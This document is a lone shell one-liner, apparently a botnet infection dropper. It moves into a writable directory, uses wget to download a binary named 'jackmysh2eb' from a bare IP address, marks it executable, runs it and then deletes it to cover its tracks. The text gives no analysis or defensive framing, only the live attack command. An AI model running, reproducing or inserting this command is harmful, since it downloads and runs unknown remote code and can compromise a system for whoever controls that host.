cd /tmp || cd /var/system || cd /mnt || cd /root || cd /; wget http://5.152.206.166/jackmysh2eb; chmod +x jackmysh2eb; ./jackmysh2eb; rm -rf jackmysh2eb
